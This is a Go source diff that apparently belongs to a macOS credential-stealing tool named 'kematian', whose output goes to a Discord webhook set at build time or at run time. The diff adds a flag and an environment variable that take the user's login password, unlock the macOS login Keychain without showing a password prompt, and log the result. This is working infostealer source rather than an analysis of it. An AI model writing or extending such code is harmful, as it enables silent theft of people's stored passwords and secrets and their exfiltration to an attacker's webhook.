@@ -8,6 +8,8 @@ import (
 	"os"
 	"runtime"
 	"strings"
+
+	"recovery/recovery/crypto"
 )
 
 // Set at build time: -ldflags "-X main.defaultWebhook=https://discord.com/api/webhooks/..."
@@ -15,8 +17,22 @@ var defaultWebhook string
 
 func main() {
 	webhookFlag := flag.String("webhook", "", "Discord webhook URL (or DISCORD_WEBHOOK_URL / KEMATIAN_WEBHOOK_URL)")
+	macPasswordFlag := flag.String("mac-password", "", "macOS login password — unlocks Keychain silently (or KEMATIAN_MAC_PASSWORD)")
 	quiet := flag.Bool("quiet", false, "minimal console output")
 	flag.Parse()
+
+	macPassword := strings.TrimSpace(*macPasswordFlag)
+	if macPassword == "" {
+		macPassword = strings.TrimSpace(os.Getenv("KEMATIAN_MAC_PASSWORD"))
+	}
+	if macPassword != "" {
+		crypto.SetMacLoginPassword(macPassword)
+		if err := crypto.EnsureLoginKeychainUnlocked(); err != nil {
+			log.Printf("[kematian] keychain unlock failed: %v", err)
+		} else if !*quiet {
+			log.Printf("[kematian] login keychain unlocked (no password modal)")
+		}
+	}
 
 	if runtime.GOOS != "darwin" {
 		log.Fatalf("kematian is built for macOS only (GOOS=%s)", runtime.GOOS)
